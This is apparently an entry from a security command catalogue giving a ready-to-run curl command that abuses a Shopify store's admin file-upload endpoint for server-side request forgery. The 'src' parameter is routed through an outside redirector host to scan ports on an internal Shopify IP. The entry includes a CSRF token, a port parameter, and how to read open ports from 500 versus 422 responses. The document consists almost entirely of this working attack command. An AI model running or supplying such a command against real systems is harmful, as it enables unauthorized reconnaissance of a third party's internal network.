---
data: >-
  curl -X POST 'https://test-4925.myshopify.com/admin/settings/files.json' -H
  'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H
  'X-CSRF-Token: F7cvLpquxqr+rFmnGVFhNEK6rV8njtebHikevxGlLJA=' -H 'Cookie:
  COOKIES' -d
  'src=http://hettoteam.tk/r.php?r=http://23.227.55.1:PORT/111111111'
tags:
  - ssrf
  - internal-scan
type: command
output: HTTP/1.1 500 or 422 based on port status
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:39:02.408Z'
id: 010a80db-52ef-43e2-9a1e-86f66f05d63a
verified: false
validated: true
submitted: true
---
# verify-internal-scan-on-shopify-ip

## Command

```bash
curl -X POST 'https://test-4925.myshopify.com/admin/settings/files.json' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'X-CSRF-Token: F7cvLpquxqr+rFmnGVFhNEK6rV8njtebHikevxGlLJA=' \
  -H 'Cookie: COOKIES' \
  -d 'src=http://hettoteam.tk/r.php?r=http://23.227.55.1:PORT/111111111'
```

## Description

Verifies port scanning on Shopify's IP via SSRF, appending /111111111 to force non-HTTP response.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `PORT` | Internal port to test | Yes |

## Examples

### Basic Usage

```bash
# Port 22
curl ... -d 'src=...23.227.55.1:22/111111111'
```

## Expected Output

500 for open internal ports.

## Related

- [[commands/perform-port-scan-on-external-host]]
